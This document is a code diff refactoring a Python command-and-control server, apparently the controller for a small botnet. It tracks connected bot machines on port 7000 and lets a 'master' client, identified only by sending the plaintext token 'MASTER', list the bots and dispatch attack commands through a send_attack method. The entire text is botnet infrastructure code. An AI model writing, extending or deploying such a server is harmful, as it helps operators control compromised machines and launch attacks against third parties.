@@ -4,20 +4,20 @@ import threading
 from time import sleep
 
 class C2server():
-    connections = []
-    addresses = []
-    masterIP = "192.168.1.134"
-
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.bind(("192.168.1.134",7000))
-    s.listen()
+    def __init__(self):
+        self.connections = []
+        self.addresses = []
+        self.masterIP = "192.168.1.134"
+        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.s.bind(("192.168.1.134",7000))
+        self.s.listen()
 
     def master(self,conn):
         while True:
             data = conn.recv(1024)
             if data == b'l': #LIST
                 self.check_conns() #CHECK CONNECTIONS
-                for i in self.addresses: #SEND CONNECTIONS
+                for i in self.addresses: #SEND CONNECTION ADDRESSES
                     for j in i:
                         string = str(j)
                         conn.send(string.encode("utf-8"))
@@ -26,15 +26,15 @@ class C2server():
                 conn.send(b'q')
             elif data == b'c':
                 data = conn.recv(2)
-                c = data.decode("utf-8")
-                self.send_attack(int(c[0]),c[1])
+                command = data.decode("utf-8")
+                self.send_attack(int(command[0]),command[1])
             elif data == b'':
                 break
 
     def catcher(self):
         while True:
             conn, addr = self.s.accept()
-            if addr[0] == self.masterIP: #Check if is it master
+            if conn.recv(6) == b'MASTER': #Check if is it master
                 x = threading.Thread(target=self.master, args=(conn,))
                 x.start()
             else:
@@ -45,11 +45,11 @@ class C2server():
     def check_conns(self):
         for i in self.connections:
             try:
-                i.send(b'a')
-                sleep(0.1)
-                i.send(b'a')
+                for _ in range(5):
+                    i.send(b'alive?')
             except:
                 index = self.connections.index(i)
+                print(f"[+] {self.addresses[index][0]}:{self.addresses[index][1]} disconnected!") #TEMP
                 self.addresses.pop(index)
                 self.connections.remove(i)
 
